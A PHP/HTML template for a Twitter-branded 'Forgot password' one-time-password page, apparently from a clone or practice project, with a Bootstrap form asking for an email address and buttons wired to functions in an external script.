<?php
session_start();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forgot password | Twitter</title>
    <!-- Include Bootstrap CSS -->
    <link rel="icon" href="twittericon.png" type="image/x-icon">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <!-- Sweet Alert -->
    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
    <!-- end -->

    <script src="script.js"></script>

    <style>
        .material-symbols-outlined {
            text-align: center;
            vertical-align: top;
            font-size: 30px;
        }
        button {
            padding: 12px;
            margin: 6px;
        }
        .pin-btn {
            width: 100px;
        }
    </style>

</head>
<body class="bg-info">
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-5">
                <div class="card bg-dark text-white">
                    <div class="card-body">
                        <h4 class="card-title"><i class="fab fa-twitter"></i>&nbsp;One-time password</h4>
                        <hr>
                        <form>
                            <div class="mb-3">
                                <label for="email" class="form-label fs-5">Email</label>
                                <input type="email" class="form-control" id="email-pin" name="email" required>
                            </div>
                            <p class="mb-3 fs-5 text-warning">
                                <i class="material-symbols-outlined">info</i>
                                &nbsp;To ensure the authenticity of the account holder, we kindly request your email address for the purpose of authentication during the sign-in process.
                            </p>
                            <hr>
                            <div class="float-end">
                                <button type="button" class="btn btn-primary pin-btn" onclick="pinEmail()">Submit</button>
                                <button type="button" class="btn btn-danger pin-btn" onclick="backToLogin()">Back</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Include Bootstrap JS (Optional) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>